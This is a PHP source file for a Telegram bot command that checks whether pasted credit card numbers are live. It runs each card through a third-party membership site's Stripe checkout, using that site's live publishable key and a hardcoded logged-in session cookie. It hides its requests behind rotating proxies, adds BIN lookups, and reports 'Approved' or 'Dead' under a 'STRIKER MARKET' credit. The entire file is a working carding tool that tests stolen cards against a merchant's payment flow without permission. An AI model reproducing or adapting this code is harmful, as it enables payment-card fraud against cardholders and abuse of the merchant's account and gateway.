<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/config/config.php";
include __DIR__."/config/variables.php";
include __DIR__."/functions/bot.php";
include __DIR__."/functions/functions.php";
include __DIR__."/functions/db.php";


////////////====[MUTE]====////////////
if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
        return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);
        
        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

            ###CHECKER PART###  
            $zip = rand(10001,90045);
            $time = rand(30000,699999);
            $rand = rand(0,99999);
            $pass = rand(0000000000,9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);
        
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            $res = curl_exec($ch);
            $muid = trim(strip_tags(capture($res,'"muid":"','"')));
            $sid = trim(strip_tags(capture($res,'"sid":"','"')));
            $guid = trim(strip_tags(capture($res,'"guid":"','"')));
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            
            
            $rp1 = array(
              1 => $config['proxy'],
              2 => $config['proxy'],
              3 => $config['proxy'],
              4 => $config['proxy'],
              5 => $config['proxy'],
              ); 
            
             $rpt = array_rand($rp1);
             $rotate = $rp1[$rpt];


            $ip = array(
              1 => 'socks5://p.webshare.io:1080',
              2 => 'http://p.webshare.io:80',
            ); 
            
            $socks = array_rand($ip);
            $socks5 = $ip[$socks];



           $url = "https://api.ipify.org/";   

          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_PROXY, $socks5);
          curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
          $ip1 = curl_exec($ch);
          curl_close($ch);
          ob_flush();   
          if (isset($ip1)){
         $ip = "Proxy live";
         }
         if (empty($ip1)){
         $ip = "Proxy Dead:[".$rotate."]";
         }
            
///////////////=[1st REQ]=/////////////////
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_PROXY, $socks5);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
           'authority: api.stripe.com',
           'method: POST',
           'path: /v1/payment_methods',
           'scheme: https',
           'accept: application/json',
           'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
           'content-type: application/x-www-form-urlencoded',
           'origin: https://js.stripe.com',
           'referer: https://js.stripe.com/',
           'sec-fetch-dest: empty',
           'sec-fetch-mode: cors',
           'sec-fetch-site: same-site',
           'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
           'user-agent: '.$ua.'',
            ));
           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
           curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
           curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
           curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]=10080&billing_details[name]=zack+mclean&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=3df213ac-49ac-4b84-b0e2-9deba9b0b72eeb1e9f&muid=419fc3cd-8d7b-482e-bade-96e495b6a1a0305691&sid=58f1941c-ee34-49b0-a24e-585928f64c7756f128&payment_user_agent=stripe.js%2Fc1e00f41%3B+stripe-js-v3%2Fc1e00f41&time_on_page=28409&referrer=https%3A%2F%2Fwww.medigraytion.com%2F&key=pk_live_290LOcAmWN8bBoRk0DCclhYI00yf5QmVmi');
           $result1 = curl_exec($ch);
            
            if(stripos($result1, 'error')){
              $errormessage = trim(strip_tags(capture($result1,'"message": "','"')));
              $stripeerror = True;
            }else{
              $id = trim(strip_tags(capture($result1,'"id": "','"')));
              $stripeerror = False;
            }
            
//////////////=[2nd Req]=//////////////////
            
            if(!$stripeerror){
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_PROXY, $socks5);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
                curl_setopt($ch, CURLOPT_URL, 'https://www.medigraytion.com/wp-admin/admin-ajax.php');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'authority: www.medigraytion.com',
                'method: POST',
                'path: /wp-admin/admin-ajax.php',
                'scheme: https',
                'accept:application/json, text/javascript, */*; q=0.01',
                'accept-language: en-US,en;q=0.9',
                'content-type: multipart/form-data; boundary=----WebKitFormBoundaryip4Mntadw5T4AAj5',
                'cookie: wordpress_sec_d78c3de304fbf92fbd7082b80ab75d9b=juanaflindsey%40gmail.com%7C1607595223%7ChNXjX18idG4o158HAawiz1lQqKN1YAadFRkpuIJy5K8%7Cfc3f197c1018ed7de81c810beb79c2d26bd68a04a9149c0d767c9f6335fbe5b2; _ga=GA1.2.1447429931.1607422337; _gid=GA1.2.1232166314.1607422337; __stripe_mid=419fc3cd-8d7b-482e-bade-96e495b6a1a0305691; __stripe_sid=58f1941c-ee34-49b0-a24e-585928f64c7756f128; wordpress_logged_in_d78c3de304fbf92fbd7082b80ab75d9b=juanaflindsey%40gmail.com%7C1607595223%7ChNXjX18idG4o158HAawiz1lQqKN1YAadFRkpuIJy5K8%7C16e0dca9da7934f53880bcb21fb4f8c19a058d31ed40771011865a25e586b4f5; _gat_gtag_UA_93020771_2=1',
                'origin: https://www.medigraytion.com',
                'referer: https://www.medigraytion.com/signup/monthly/?action=checkout&txn=nn',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-origin',
                'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
                'user-agent: '.$ua.'',
                'x-requested-with: XMLHttpRequest',

                ));
                curl_setopt($ch, CURLOPT_POSTFIELDS,'------WebKitFormBoundaryip4Mntadw5T4AAj5
                Content-Disposition: form-data; name="mepr_transaction_id"
                
                851
                ------WebKitFormBoundaryip4Mntadw5T4AAj5
                Content-Disposition: form-data; name="address_required"
                
                0
                ------WebKitFormBoundaryip4Mntadw5T4AAj5
                Content-Disposition: form-data; name="card-name"
                
                zack mclean
                ------WebKitFormBoundaryip4Mntadw5T4AAj5
                Content-Disposition: form-data; name="payment_method_id"
                
                pm_1Hw3CzFNTmox1iC2MyNT2Xkp
                ------WebKitFormBoundaryip4Mntadw5T4AAj5
                Content-Disposition: form-data; name="action"
                
                mepr_stripe_confirm_payment
                ------WebKitFormBoundaryip4Mntadw5T4AAj5
                Content-Disposition: form-data; name="mepr_current_url"
                
                https://www.medigraytion.com/signup/monthly/?action=checkout&txn=nn#mepr_jump
                ------WebKitFormBoundaryip4Mntadw5T4AAj5--');
                $result2 = curl_exec($ch);
                $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));
            }
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);

            ###END OF CHECKER PART###
            
            
            if(strpos($result2, 'client_secret')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» CVV or CCN ✅
Response -» Approved
Gateway -» Stripe Auth
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>CHECKBY → <a href='tg://user?id=$userId'>$firstname</a></b>
<b>BOTBY → <a href='t.me/strikermarket'>STRIKER MARKET</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            elseif($result2 == null && !$stripeerror) {
              addTotal();
              addUserTotal($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» API Down ❌
Response -» Unknown
Gateway -» Stripe Auth
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>CHECKBY → <a href='tg://user?id=$userId'>$firstname</a></b>
<b>BOTBY → <a href='t.me/strikermarket'>STRIKER MARKET</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            else{
              addTotal();
              addUserTotal($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Dead ❌
Response -» $errormessage
Gateway -» Stripe Auth
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>CHECKBY → <a href='tg://user?id=$userId'>$firstname</a></b>
<b>BOTBY → <a href='t.me/strikermarket'>STRIKER MARKET</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
          
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>
